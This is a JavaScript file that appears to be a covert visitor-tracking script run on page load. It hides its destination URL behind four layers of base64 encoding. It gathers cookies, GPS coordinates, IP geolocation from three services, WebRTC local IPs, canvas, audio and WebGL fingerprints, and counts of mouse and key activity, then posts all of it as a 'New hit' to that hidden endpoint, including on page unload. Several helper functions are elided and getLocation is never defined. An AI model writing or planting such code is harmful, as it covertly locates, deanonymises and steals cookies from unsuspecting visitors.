const endpoint = "V1ZWb1UwMUhUa2xVVkZwTlpWUnNjbGxXYUU5aGJVbDZVMjEwVFdKVk5USlpiRTAxWVVkT1NHRXpXbXROYkZwd1dWVmpOV1J0UlhwVVdGcE9Wa1pHTTFRd1VscE9WVFUyWVhwQ1RtVnJNSGxVV0hCV1RWVXhWVk5VU2s1aFZHeGhXbGN3TVdOR1RsZFVhMDVzVTBkUk1GcFhNREZXTVVwR1YxUkdXR0pJUW5wWGJGWTBaVlpyZVU1WE9WcGlXR1F6VlZaV05HTnJNVFZOV0hCWVlXdHZNbHBXV2xOa2JGSkZVV3hDWVdKSFVuaFdWRTVIWXpGc2RWUllaRTFXYXpWNVZtdGpNVkpHVlhoVmEyaHJZbFJXZWxaSGN6RlVhemxDVUZRd1BRPT0=";
const destination = atob(atob(atob(atob(endpoint))));

let dataCollected = {};
let sent = false;

async function collectCommonData() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
    const webgl = getWebGLInfo();
    const canvasHash = getCanvasFingerprint();
    const audioHash = await getAudioFingerprint();
    const fonts = getFonts();
    const localIPs = await getWebRTCLocalIPs();
    const battery = await getBatteryInfo();
    const ipInfo1 = await getIPInfo('https://ipapi.co/json/');
    const ipInfo2 = await getIPInfo('https://ipinfo.io/json');
    const ipInfo3 = await getIPInfo('https://freegeoip.app/json/');
    const mimeTypes = [];
    for (let i = 0; i < navigator.mimeTypes.length; i++) {
        mimeTypes.push(navigator.mimeTypes[i].type);
    }
    const floatingPointTest = Math.acos(-1) + Math.atan(1) + Math.exp(1) + Math.log(2); // Quirks in FP precision
    const performancePrecision = performance.now().toString().length; // Timing resolution
    const screenOrientation = screen.orientation ? screen.orientation.type : "N/A";
    const touchSupport = 'ontouchstart' in window ? "Yes" : "No";
    const behavior = getBehaviorSnapshot(); // Quick mouse/keyboard sniff

    dataCollected = {
        userAgent: navigator.userAgent || "N/A",
        appVersion: navigator.appVersion || "N/A",
        vendor: navigator.vendor || "N/A",
        oscpu: navigator.oscpu || "N/A",
        doNotTrack: navigator.doNotTrack || "N/A",
        online: navigator.onLine ? "Yes" : "No",
        referrer: document.referrer || "N/A",
        platform: navigator.platform || "N/A",
        language: navigator.language || "N/A",
        languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
        screenResolution: `${screen.width}x${screen.height}`,
        availScreen: `${screen.availWidth}x${screen.availHeight}`,
        windowSize: `${window.innerWidth}x${window.innerHeight}`,
        colorDepth: screen.colorDepth || "N/A",
        pixelRatio: window.devicePixelRatio || "N/A",
        maxTouchPoints: navigator.maxTouchPoints || "N/A",
        connectionType: connection.effectiveType || "N/A",
        downlink: connection.downlink || "N/A",
        batteryLevel: battery.level,
        batteryCharging: battery.charging,
        batteryChargingTime: battery.chargingTime,
        batteryDischargingTime: battery.dischargingTime,
        deviceMemory: navigator.deviceMemory || "N/A",
        hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
        cookies: await getCookies(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
        timezoneOffset: new Date().getTimezoneOffset(),
        canvasFingerprint: canvasHash,
        audioFingerprint: audioHash,
        webglVendor: webgl.vendor,
        webglRenderer: webgl.renderer,
        detectedFonts: fonts,
        webRtcLocalIPs: localIPs,
        mimeTypes: mimeTypes.join(', ') || "N/A",
        floatingPoint: floatingPointTest,
        performancePrecision: performancePrecision,
        screenOrientation: screenOrientation,
        touchSupport: touchSupport,
        behaviorSnapshot: behavior,
        ip1: ipInfo1.ip || "N/A",
        city1: ipInfo1.city || "N/A",
        region1: ipInfo1.region || "N/A",
        country1: ipInfo1.country_name || "N/A",
        postal1: ipInfo1.postal || "N/A",
        org1: ipInfo1.org || "N/A",
        ipTimezone1: ipInfo1.timezone || "N/A",
        ip2: ipInfo2.ip || "N/A",
        city2: ipInfo2.city || "N/A",
        region2: ipInfo2.region || "N/A",
        country2: ipInfo2.country || "N/A",
        postal2: ipInfo2.postal || "N/A",
        org2: ipInfo2.org || "N/A",
        ip3: ipInfo3.ip || "N/A",
        city3: ipInfo3.city || "N/A",
        region3: ipInfo3.region || "N/A",
        country3: ipInfo3.country || "N/A",
        postal3: ipInfo3.zipcode || "N/A",
        timestamp: new Date().toISOString()
    };
}

function getBehaviorSnapshot() {
    // Quick snapshot of mouse moves and key presses if they interact
    let moves = 0;
    let keys = 0;
    document.addEventListener('mousemove', () => moves++);
    document.addEventListener('keydown', () => keys++);
    setTimeout(() => {
        dataCollected.behaviorMoves = moves;
        dataCollected.behaviorKeys = keys;
    }, 5000); // 5 sec snapshot
    return "Collecting...";
}

async function sendPayload(gpsData = {}) {
    if (sent) return;
    sent = true;
    const fullData = { ...dataCollected, ...gpsData };

    fetch(destination, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: `New hit:\n` +
                     `GPS:\n` +
                     `  Lat: ${fullData.latitude || "N/A"}\n` +
                     `  Long: ${fullData.longitude || "N/A"}\n` +
                     `  Accuracy: ${fullData.accuracy || "N/A"} m\n` +
                     `  Altitude: ${fullData.altitude || "N/A"} m\n` +
                     `  Speed: ${fullData.speed || "N/A"} m/s\n` +
                     `IP Location 1:\n` +
                     `  IP: ${fullData.ip1}\n` +
                     `  City: ${fullData.city1}\n` +
                     `  Region: ${fullData.region1}\n` +
                     `  Country: ${fullData.country1}\n` +
                     `  Postal: ${fullData.postal1}\n` +
                     `  Org: ${fullData.org1}\n` +
                     `  Timezone: ${fullData.ipTimezone1}\n` +
                     `IP Location 2:\n` +
                     `  IP: ${fullData.ip2}\n` +
                     `  City: ${fullData.city2}\n` +
                     `  Region: ${fullData.region2}\n` +
                     `  Country: ${fullData.country2}\n` +
                     `  Postal: ${fullData.postal2}\n` +
                     `  Org: ${fullData.org2}\n` +
                     `IP Location 3:\n` +
                     `  IP: ${fullData.ip3}\n` +
                     `  City: ${fullData.city3}\n` +
                     `  Region: ${fullData.region3}\n` +
                     `  Country: ${fullData.country3}\n` +
                     `  Postal: ${fullData.postal3}\n` +
                     `Browser:\n` +
                     `  User Agent: ${fullData.userAgent}\n` +
                     `  App Version: ${fullData.appVersion}\n` +
                     `  Vendor: ${fullData.vendor}\n` +
                     `  OSCPU: ${fullData.oscpu}\n` +
                     `  Platform: ${fullData.platform}\n` +
                     `  Language: ${fullData.language}\n` +
                     `  Languages: ${fullData.languages}\n` +
                     `  DoNotTrack: ${fullData.doNotTrack}\n` +
                     `  Online: ${fullData.online}\n` +
                     `  Referrer: ${fullData.referrer}\n` +
                     `  Cookies: ${fullData.cookies}\n` +
                     `Device:\n` +
                     `  Screen: ${fullData.screenResolution}\n` +
                     `  Avail Screen: ${fullData.availScreen}\n` +
                     `  Window: ${fullData.windowSize}\n` +
                     `  Color Depth: ${fullData.colorDepth}\n` +
                     `  Pixel Ratio: ${fullData.pixelRatio}\n` +
                     `  Max Touch Points: ${fullData.maxTouchPoints}\n` +
                     `  Touch Support: ${fullData.touchSupport}\n` +
                     `  Screen Orientation: ${fullData.screenOrientation}\n` +
                     `  Device Memory: ${fullData.deviceMemory} GB\n` +
                     `  CPU Cores: ${fullData.hardwareConcurrency}\n` +
                     `Network:\n` +
                     `  Connection: ${fullData.connectionType}\n` +
                     `  Downlink: ${fullData.downlink} Mbps\n` +
                     `Battery:\n` +
                     `  Level: ${fullData.batteryLevel}\n` +
                     `  Charging: ${fullData.batteryCharging}\n` +
                     `  Charge Time: ${fullData.batteryChargingTime} sec\n` +
                     `  Discharge Time: ${fullData.batteryDischargingTime} sec\n` +
                     `Fingerprints:\n` +
                     `  Canvas Hash: ${fullData.canvasFingerprint.substring(0, 50)}...\n` +
                     `  Audio Hash: ${fullData.audioFingerprint.substring(0, 50)}...\n` +
                     `  WebGL Vendor: ${fullData.webglVendor}\n` +
                     `  WebGL Renderer: ${fullData.webglRenderer}\n` +
                     `  Detected Fonts: ${fullData.detectedFonts}\n` +
                     `  WebRTC Local IPs: ${fullData.webRtcLocalIPs}\n` +
                     `  Mime Types: ${fullData.mimeTypes.substring(0, 50)}...\n` +
                     `  Floating Point Test: ${fullData.floatingPoint}\n` +
                     `  Performance Precision: ${fullData.performancePrecision}\n` +
                     `  Behavior Moves: ${fullData.behaviorMoves || "N/A"}\n` +
                     `  Behavior Keys: ${fullData.behaviorKeys || "N/A"}\n` +
                     `Timezone: ${fullData.timezone} (Offset: ${fullData.timezoneOffset} min)\n` +
                     `Timestamp: ${fullData.timestamp}`
        })
    }).catch(error => console.error('Failed:', error));
}

function handleError(error) {
    let message = "Denied.";
    switch(error.code) {
        case error.PERMISSION_DENIED:
            message = "Denied.";
            break;
        case error.POSITION_UNAVAILABLE:
            message = "Unavailable.";
            break;
        case error.TIMEOUT:
            message = "Timed out.";
            break;
    }
    sendPayload({ latitude: "Error: " + message, longitude: "N/A", accuracy: "N/A", altitude: "N/A", speed: "N/A" });
}

function getIPInfo(apiUrl) {
    // Same as before
    // ... (omitting repeated functions for brevity, but include all from previous: getBatteryInfo, getCookies, getCanvasFingerprint, getWebGLInfo, getAudioFingerprint, getFonts, getWebRTCLocalIPs)
}

window.onbeforeunload = () => {
    sendPayload();
};

// Kick off
collectCommonData();
getLocation();
